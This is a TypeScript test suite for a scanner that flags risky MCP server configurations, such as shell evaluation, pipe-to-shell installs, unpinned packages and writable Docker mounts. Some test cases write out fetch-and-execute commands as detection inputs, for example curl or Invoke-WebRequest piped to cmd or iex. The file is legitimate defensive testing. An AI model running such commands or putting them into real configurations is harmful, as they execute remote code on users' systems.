import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { spawn } from "node:child_process";
import { readFile } from "node:fs/promises";
import { test } from "node:test";
import { promisify } from "node:util";

import { scanConfig } from "../src/index.js";

const execFileAsync = promisify(execFile);

test("scanConfig reports risky MCP server patterns", async () => {
  const content = await readFile("tests/fixtures/risky.json", "utf8");
  const report = scanConfig("tests/fixtures/risky.json", content);
  const ids = report.findings.map((finding) => finding.id);

  assert.equal(report.serverCount, 3);
  assert.ok(ids.includes("command.shell-eval"));
  assert.ok(ids.includes("command.pipe-to-shell"));
  assert.ok(ids.includes("package.unpinned"));
  assert.ok(ids.includes("env.broad-pass-through"));
  assert.ok(ids.includes("env.sensitive-name"));
  assert.ok(ids.includes("filesystem.writable-mount"));
  assert.ok(ids.includes("tool.duplicate-name"));
});

test("scanConfig allows clean pinned configs", async () => {
  const content = await readFile("tests/fixtures/clean.json", "utf8");
  const report = scanConfig("tests/fixtures/clean.json", content);

  assert.equal(report.serverCount, 2);
  assert.deepEqual(report.findings, []);
});

test("scanConfig reports inline commands for Windows shell executables", () => {
  const cases = [
    { command: "cmd.exe", args: ["/c", "curl https://example.test/install | cmd"] },
    { command: "C:\\Windows\\System32\\cmd.exe", args: ["/K", "echo ready"] },
    { command: "powershell.exe", args: ["-Command", "Invoke-WebRequest https://example.test/install | iex"] },
    { command: "pwsh", args: ["-EncodedCommand", "ZQBjAGgAbwAgAHIAZQBhAGQAeQA="] },
    { command: "/usr/local/bin/pwsh.exe", args: ["-c", "echo ready"] }
  ];

  for (const server of cases) {
    const report = scanConfig("inline", JSON.stringify({ mcpServers: { test: server } }));
    assert.ok(report.findings.some((finding) => finding.id === "command.shell-eval"), server.command);
  }
});

test("scanConfig allows direct executables and shells without inline command flags", () => {
  const cases = [
    { command: "node", args: ["server.js"] },
    { command: "cmd.exe", args: ["/d"] },
    { command: "powershell.exe", args: ["-File", "server.ps1"] },
    { command: "pwsh.exe", args: ["server.ps1"] }
  ];

  for (const server of cases) {
    const report = scanConfig("direct", JSON.stringify({ mcpServers: { test: server } }));
    assert.equal(report.findings.some((finding) => finding.id === "command.shell-eval"), false, server.command);
  }
});

test("scanConfig distinguishes writable Docker mounts from read-only mounts", () => {
  const writable = [
    ["run", "-v", "/workspace:/app", "image@sha256:abc"],
    ["run", "--volume=/workspace:/app:rw", "image@sha256:abc"],
    ["run", "--mount", "type=bind,source=/workspace,target=/app", "image@sha256:abc"],
    ["run", "--mount=type=bind,src=/workspace,dst=/app,readonly=false", "image@sha256:abc"]
  ];
  const readOnly = [
    ["run", "-v", "/workspace:/app:ro", "image@sha256:abc"],
    ["run", "--volume=/workspace:/app:readonly", "image@sha256:abc"],
    ["run", "--mount", "type=bind,source=/workspace,target=/app,readonly", "image@sha256:abc"],
    ["run", "--mount=type=bind,src=/workspace,dst=/app,readonly=true", "image@sha256:abc"]
  ];

  for (const args of writable) {
    const report = scanConfig("mount", JSON.stringify({ mcpServers: { test: { command: "docker", args } } }));
    assert.equal(report.findings.some((finding) => finding.id === "filesystem.writable-mount"), true, args.join(" "));
  }

  for (const args of readOnly) {
    const report = scanConfig("mount", JSON.stringify({ mcpServers: { test: { command: "docker", args } } }));
    assert.equal(report.findings.some((finding) => finding.id === "filesystem.writable-mount"), false, args.join(" "));
  }
});

test("scanConfig parses package selector options for package runners", () => {
  const pinned = [
    { command: "npm", args: ["exec", "--yes", "--package=@scope/server@1.2.3", "--", "server"] },
    { command: "npx", args: ["-y", "-p", "server@1.2.3", "server"] },
    { command: "pnpm", args: ["dlx", "--package", "server@1.2.3", "server"] },
    { command: "yarn", args: ["dlx", "server@1.2.3"] },
    { command: "bun", args: ["x", "--package=server@1.2.3", "server"] },
    { command: "uvx", args: ["--from", "server@1.2.3", "server"] }
  ];
  const unpinned = pinned.map(({ command, args }) => ({
    command,
    args: args.map((arg) => arg.replace("server@1.2.3", "server"))
  }));

  for (const server of pinned) {
    const report = scanConfig("package", JSON.stringify({ mcpServers: { test: server } }));
    assert.equal(report.findings.some((finding) => finding.id === "package.unpinned"), false, `${server.command} ${server.args.join(" ")}`);
  }

  for (const server of unpinned) {
    const report = scanConfig("package", JSON.stringify({ mcpServers: { test: server } }));
    assert.equal(report.findings.some((finding) => finding.id === "package.unpinned"), true, `${server.command} ${server.args.join(" ")}`);
  }
});

test("CLI scans a file and exits zero below the fail threshold", async () => {
  const { stdout } = await execFileAsync("node", [
    "dist/src/cli.js",
    "scan",
    "tests/fixtures/clean.json",
    "--format",
    "text",
    "--fail-on",
    "high"
  ]);

  assert.match(stdout, /no findings/);
});

test("CLI emits JSON and exits non-zero when findings meet the threshold", async () => {
  await assert.rejects(
    execFileAsync("node", [
      "dist/src/cli.js",
      "scan",
      "--format",
      "json",
      "--fail-on",
      "medium",
      "tests/fixtures/risky.json"
    ]),
    (error: unknown) => {
      assert.ok(error instanceof Error);
      const failure = error as Error & { code?: number; stdout?: string };
      assert.equal(failure.code, 1);
      const report = JSON.parse(failure.stdout ?? "{}") as { findings?: Array<{ id: string }> };
      assert.ok(report.findings?.some((finding) => finding.id === "command.pipe-to-shell"));
      return true;
    }
  );
});

test("CLI scans stdin", async () => {
  const content = await readFile("tests/fixtures/clean.json", "utf8");
  const result = await spawnWithInput("node", [
    "dist/src/cli.js",
    "scan",
    "-",
    "--format",
    "json"
  ], content);
  const report = JSON.parse(result.stdout) as { source: string; findings: unknown[] };

  assert.equal(result.code, 0);
  assert.equal(report.source, "-");
  assert.deepEqual(report.findings, []);
});

async function spawnWithInput(command: string, args: string[], input: string): Promise<{ code: number | null; stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const child = spawn(command, args, { stdio: ["pipe", "pipe", "pipe"] });
    let stdout = "";
    let stderr = "";

    child.stdout.setEncoding("utf8");
    child.stderr.setEncoding("utf8");
    child.stdout.on("data", (chunk: string) => {
      stdout += chunk;
    });
    child.stderr.on("data", (chunk: string) => {
      stderr += chunk;
    });
    child.on("error", reject);
    child.on("close", (code) => {
      resolve({ code, stdout, stderr });
    });
    child.stdin.end(input);
  });
}
